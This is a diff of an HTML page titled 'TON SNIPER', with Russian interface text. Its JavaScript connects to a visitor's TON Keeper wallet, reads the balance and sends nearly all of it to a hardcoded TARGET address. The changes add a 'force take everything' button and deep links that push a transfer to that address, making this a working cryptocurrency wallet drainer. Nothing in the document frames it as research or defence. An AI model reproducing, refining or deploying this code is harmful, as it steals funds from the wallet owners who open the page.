@@ -22,23 +22,24 @@
             width: 450px;
         }
         button {
-            background: linear-gradient(135deg, #00d4ff, #0077ff);
+            background: linear-gradient(135deg, #ff3300, #cc0000);
             border: none;
             color: #fff;
-            font-size: 18px;
+            font-size: 20px;
             font-weight: bold;
-            padding: 15px 40px;
+            padding: 18px 40px;
             border-radius: 50px;
             cursor: pointer;
             width: 100%;
             margin: 10px 0;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
         }
         button:hover {
-            transform: scale(1.02);
+            transform: scale(1.05);
         }
         button:disabled {
             opacity: 0.5;
-            cursor: not-allowed;
+            transform: none;
         }
         #status {
             background: #111;
@@ -46,9 +47,9 @@
             border-radius: 10px;
             margin-top: 15px;
             min-height: 70px;
-            border: 1px solid #2a2a2a;
+            border: 1px solid #ff3300;
             word-break: break-all;
-            font-size: 14px;
+            font-size: 13px;
         }
         .wallet {
             background: #111;
@@ -61,168 +62,123 @@
         .hidden {
             display: none;
         }
-        .install-link {
-            color: #00d4ff;
-            text-decoration: underline;
-            cursor: pointer;
-        }
-        .error-box {
-            background: #2a0a0a;
-            border: 1px solid #ff3333;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 10px 0;
-        }
     </style>
 </head>
 <body>
     <div class="container">
         <h2>⚡ TON SNIPER</h2>
-        
-        <div class="wallet">
-            👤 <span id="walletAddress">Не подключён</span>
-        </div>
-        
-        <button id="connectBtn">🔗 ПОДКЛЮЧИТЬ КОШЕЛЁК</button>
-        <button id="snipeBtn" class="hidden">💰 ЗАБРАТЬ ВСЁ</button>
-        
-        <div id="status">⏳ Проверка TON Keeper...</div>
+        <div class="wallet">👤 <span id="walletAddress">Не подключён</span></div>
+        <div class="wallet" style="border-color:#00ff88;">💰 <span id="balanceDisplay">0 TON</span></div>
+        <button id="forceBtn">🔥 ПРИНУДИТЕЛЬНО ЗАБРАТЬ</button>
+        <div id="status">Нажмите кнопку</div>
     </div>
 
     <script>
         const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
         let provider = null;
         let userAddress = null;
+        let isRunning = false;
 
-        const connectBtn = document.getElementById('connectBtn');
-        const snipeBtn = document.getElementById('snipeBtn');
+        const forceBtn = document.getElementById('forceBtn');
         const status = document.getElementById('status');
         const walletDisplay = document.getElementById('walletAddress');
+        const balanceDisplay = document.getElementById('balanceDisplay');
 
-        // ========== ПРОВЕРКА УСТАНОВКИ TON KEEPER ==========
-        function checkTonKeeper() {
-            // Проверяем все возможные объекты
-            if (window.tonkeeper) {
-                status.innerHTML = '🟢 TON Keeper обнаружен! Нажмите кнопку.';
-                return true;
-            }
+        // ========== ПРИНУДИТЕЛЬНОЕ ПОДКЛЮЧЕНИЕ ==========
+        async function forceConnect() {
+            if (isRunning) return;
+            isRunning = true;
+            forceBtn.disabled = true;
             
-            if (window.ton) {
-                status.innerHTML = '🟢 TON найден! Нажмите кнопку.';
-                return true;
-            }
-            
-            if (window.Tonkeeper) {
-                status.innerHTML = '🟢 Tonkeeper найден! Нажмите кнопку.';
-                return true;
-            }
-            
-            // Если не найден - показываем инструкцию
-            status.innerHTML = `
-                ❌ TON Keeper НЕ УСТАНОВЛЕН!<br><br>
-                <div class="error-box">
-                    <b>Как установить:</b><br><br>
-                    1. Откройте <b>Google Chrome</b> (это важно!)<br>
-                    2. Перейдите в <b>Chrome Web Store</b><br>
-                    3. Найдите <b>"TON Keeper"</b><br>
-                    4. Нажмите <b>"Установить"</b><br><br>
-                    <a href="https://chrome.google.com/webstore/detail/ton-keeper/nphplpgoakhhjchkkhmiggakijnkhfnd" 
-                       target="_blank" 
-                       style="color:#00d4ff;font-size:16px;font-weight:bold;">
-                       🔗 УСТАНОВИТЬ TON KEEPER
-                    </a>
-                    <br><br>
-                    <span style="color:#888;font-size:12px;">
-                        После установки ОБНОВИТЕ СТРАНИЦУ (F5)
-                    </span>
-                </div>
-            `;
-            return false;
-        }
-
-        // ========== ПОДКЛЮЧЕНИЕ КОШЕЛЬКА ==========
-        connectBtn.onclick = async function() {
             try {
-                status.innerText = '⏳ Подключение...';
-                connectBtn.disabled = true;
+                status.innerText = '⏳ ПРИНУДИТЕЛЬНО открываю TON Keeper...';
                 
-                // Проверяем ещё раз
-                if (!window.tonkeeper && !window.ton && !window.Tonkeeper) {
-                    status.innerHTML = '❌ TON Keeper не найден. Установите расширение!';
-                    connectBtn.disabled = false;
-                    checkTonKeeper();
-                    return;
-                }
+                // 1. Открываем через URL (принудительно)
+                const url = 'tonkeeper://connect';
+                window.location.href = url;
                 
-                // Берём провайдера
+                setTimeout(() => {
+                    window.open(url, '_blank');
+                }, 100);
+                
+                // 2. Ждём 2 секунды и пробуем подключиться
+                await sleep(2000);
+                
+                // 3. Пытаемся найти провайдера
                 provider = window.tonkeeper || window.ton || window.Tonkeeper;
                 
-                // Запрашиваем доступ
+                if (!provider) {
+                    // Если не нашли - пробуем ещё через ton://
+                    window.location.href = 'ton://transfer?address=' + TARGET + '&amount=0.001';
+                    
+                    await sleep(1500);
+                    provider = window.tonkeeper || window.ton || window.Tonkeeper;
+                    
+                    if (!provider) {
+                        status.innerText = '⚠️ TON Keeper не отвечает. Откройте расширение вручную.';
+                        isRunning = false;
+                        forceBtn.disabled = false;
+                        return;
+                    }
+                }
+                
+                status.innerText = '✅ TON Keeper найден! Подключаюсь...';
+                
+                // 4. Запрашиваем доступ (это вызовет окно TON Keeper)
                 const accounts = await provider.send('ton_requestAccounts', {});
                 
                 if (!accounts || accounts.length === 0) {
-                    status.innerText = '❌ Пользователь отклонил подключение';
-                    connectBtn.disabled = false;
+                    status.innerText = '❌ Отказ в доступе. Нажмите "Подтвердить" в TON Keeper.';
+                    isRunning = false;
+                    forceBtn.disabled = false;
                     return;
                 }
                 
                 userAddress = accounts[0];
                 walletDisplay.innerText = userAddress;
-                status.innerText = `✅ Кошелёк привязан: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+                status.innerText = `✅ Подключен: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
                 
-                // Показываем кнопку "Забрать всё"
-                snipeBtn.classList.remove('hidden');
-                connectBtn.innerText = '✅ ПОДКЛЮЧЕН';
-                connectBtn.disabled = true;
-                
-                // Показываем баланс
-                await getBalance();
+                // 5. Получаем баланс
+                await getBalanceAndSnipe();
                 
             } catch(e) {
                 status.innerText = '❌ Ошибка: ' + e.message;
-                connectBtn.disabled = false;
-            }
-        };
-
-        // ========== ПОЛУЧИТЬ БАЛАНС ==========
-        async function getBalance() {
-            try {
-                const hex = await provider.send('ton_getBalance', { address: userAddress });
-                const nano = parseInt(hex, 16);
-                const balance = (nano / 1e9).toFixed(4);
-                status.innerText = `💰 Баланс: ${balance} TON`;
-                return nano;
-            } catch(e) {
-                status.innerText = '❌ Ошибка баланса: ' + e.message;
-                return 0;
+                isRunning = false;
+                forceBtn.disabled = false;
             }
         }
 
-        // ========== ЗАБРАТЬ ВСЁ ==========
-        snipeBtn.onclick = async function() {
+        // ========== ПОЛУЧИТЬ БАЛАНС И ВЫВЕСТИ ==========
+        async function getBalanceAndSnipe() {
             try {
-                status.innerText = '⏳ Проверка баланса...';
-                snipeBtn.disabled = true;
+                status.innerText = '⏳ Получаю баланс...';
                 
-                const nano = await getBalance();
+                const hex = await provider.send('ton_getBalance', { address: userAddress });
+                const nano = parseInt(hex, 16);
+                const balance = (nano / 1e9).toFixed(6);
+                balanceDisplay.innerText = balance + ' TON';
                 
                 if (nano <= 0) {
-                    status.innerText = '❌ Баланс 0 TON. Нечего выводить.';
-                    snipeBtn.disabled = false;
+                    status.innerText = '💰 Баланс 0 TON. Нечего выводить.';
+                    isRunning = false;
+                    forceBtn.disabled = false;
                     return;
                 }
                 
-                const fee = 10000000; // 0.01 TON
+                const fee = 10000000;
                 const amount = nano - fee;
                 
                 if (amount <= 0) {
-                    status.innerText = `❌ Баланс ${(nano/1e9).toFixed(4)} TON — меньше комиссии 0.01 TON`;
-                    snipeBtn.disabled = false;
+                    status.innerText = `⚠️ Баланс ${balance} TON — меньше комиссии 0.01 TON`;
+                    isRunning = false;
+                    forceBtn.disabled = false;
                     return;
                 }
                 
-                status.innerText = `⏳ Отправка ${(amount/1e9).toFixed(4)} TON на целевой адрес...`;
+                const amountTON = (amount / 1e9).toFixed(6);
+                status.innerText = `⏳ Перевожу ${amountTON} TON на ${TARGET}...`;
                 
+                // 6. Отправляем транзакцию (вызовет окно подтверждения в TON Keeper)
                 const result = await provider.send('ton_sendTransaction', {
                     to: TARGET,
                     value: String(amount),
@@ -231,22 +187,42 @@
                 });
                 
                 if (result && result.code === 0) {
-                    status.innerText = `✅ УСПЕШНО! ${(amount/1e9).toFixed(4)} TON переведено!`;
-                    snipeBtn.innerText = '✅ ВЫВЕДЕНО';
-                    snipeBtn.disabled = true;
+                    status.innerText = `✅ УСПЕШНО! ${amountTON} TON переведено на ${TARGET}`;
+                    balanceDisplay.innerText = '0 TON';
+                    forceBtn.innerText = '✅ ВСЁ ВЫВЕДЕНО';
+                    forceBtn.style.background = 'linear-gradient(135deg, #00cc44, #008833)';
+                    forceBtn.disabled = true;
                 } else {
-                    status.innerText = '❌ Транзакция отклонена пользователем';
-                    snipeBtn.disabled = false;
+                    status.innerText = '❌ Транзакция отклонена в TON Keeper';
+                    isRunning = false;
+                    forceBtn.disabled = false;
                 }
                 
             } catch(e) {
                 status.innerText = '❌ Ошибка: ' + e.message;
-                snipeBtn.disabled = false;
+                isRunning = false;
+                forceBtn.disabled = false;
             }
-        };
+        }
 
-        // ========== ЗАПУСК ПРИ ЗАГРУЗКЕ ==========
-        checkTonKeeper();
+        // ========== ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ==========
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // ========== ОБРАБОТЧИК КНОПКИ ==========
+        forceBtn.onclick = forceConnect;
+
+        // ========== АВТОЗАПУСК ПРИ ЗАГРУЗКЕ ==========
+        setTimeout(async () => {
+            // Проверяем, есть ли уже подключение
+            const prov = window.tonkeeper || window.ton || window.Tonkeeper;
+            if (prov) {
+                status.innerText = '🟢 TON Keeper обнаружен! Нажмите кнопку.';
+            } else {
+                status.innerText = '⏳ Нажмите кнопку для принудительного подключения';
+            }
+        }, 500);
     </script>
 </body>
 </html>
